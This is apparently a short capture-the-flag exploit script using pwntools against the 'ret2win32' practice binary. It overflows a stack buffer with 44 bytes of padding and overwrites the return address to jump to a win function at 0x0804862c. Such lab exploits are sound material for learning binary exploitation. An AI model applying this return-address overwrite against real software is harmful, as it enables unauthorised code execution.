from pwn import *

r=process('./ret2win32')

r.recvuntil('> ')

payload='a'*44
payload+=p32(0x0804862c)

r.sendline(payload)
r.interactive()
